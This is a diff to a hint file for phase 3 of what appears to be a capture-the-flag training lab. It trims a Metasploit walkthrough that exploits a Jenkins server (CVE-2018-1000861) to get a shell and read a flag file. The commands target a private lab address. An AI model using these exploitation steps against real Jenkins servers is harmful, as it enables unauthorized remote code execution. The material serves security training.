@@ -1,36 +1,28 @@
 HINT -- phase 3 (msfconsole)
 ══════════════════════════════════════════════════════════════════
 
-THE FULL METASPLOIT WALK
-────────────────────────
-Open metasploit:
+THE FIVE COMMANDS
+─────────────────
+Module and callback are preloaded for you. Type these in order,
+one at a time:
 
     msfconsole
-
-Then type these inside the msf6 prompt, one at a time:
-
-    search CVE-2018-1000861
-    use 0
     set RHOSTS 10.4.12.1
-    set LHOST 10.4.12.99
-    check
     exploit
-
-WHAT HAPPENS WHEN EXPLOIT FIRES
-───────────────────────────────
-You'll see "Command shell session 1 opened" and the prompt goes
-blank. You're on the Jenkins box now -- typing commands AS the
-jenkins user. Read the blueprint:
-
     cat /var/m0use/blueprint.txt
+    exit
 
-The flag is on the line that starts with "Flag:". Copy the value
-from inside m0use{...}.
+WHAT YOU'LL SEE
+───────────────
+After `exploit` you'll see "Command shell session 1 opened" and
+the prompt goes blank. You're on the Jenkins box -- typing as the
+jenkins user.
 
-GETTING BACK OUT
-────────────────
-To leave the shell session:   exit
-To leave msfconsole:          exit
+After `cat /var/m0use/blueprint.txt` the flag is on the line that
+starts with "Flag:". Copy what's inside m0use{...}.
+
+After `exit` you're back at the m0usenet prompt (one exit closes
+the session AND leaves metasploit).
 
 HOW TO SUBMIT
 ─────────────
